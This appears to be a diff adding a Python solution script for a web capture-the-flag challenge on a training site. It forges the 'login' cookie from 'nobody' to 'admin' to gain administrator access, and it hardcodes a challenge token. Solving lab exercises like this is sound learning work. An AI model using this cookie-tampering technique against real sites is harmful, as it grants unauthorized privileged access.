@@ -1,0 +1,33 @@
+import requests
+
+
+def escalate_cookie():
+    url = "https://cyber-learning.fr/cyber-challenge/web/web12/"
+
+    # 1) Première requête pour récupérer la cookie jar
+    r1 = requests.get(url, params={"jeton": "4gG6v26NaL16", "keyword": "test"})
+    cookies_dict = requests.utils.dict_from_cookiejar(r1.cookies)
+    print("[+] Cookie initial :", cookies_dict)  # ex: {'login': 'nobody'}
+
+    # 2) On modifie la valeur de 'login' en 'admin'
+    cookies_dict["login"] = "admin"
+
+    # 3) Deuxième requête en injectant ce nouveau cookie
+    params = {
+        "jeton": "4gG6v26NaL16",
+        "keyword": "admin"
+    }
+    r2 = requests.get(url, params=params, cookies=cookies_dict)
+
+    print("[+] Réponse second call :")
+    print("[Status]", r2.status_code)
+    print("[Headers]", r2.headers)
+    print("[Body]")
+    print(r2.text)
+
+
+if __name__ == "__main__":
+    escalate_cookie()
+
+
+
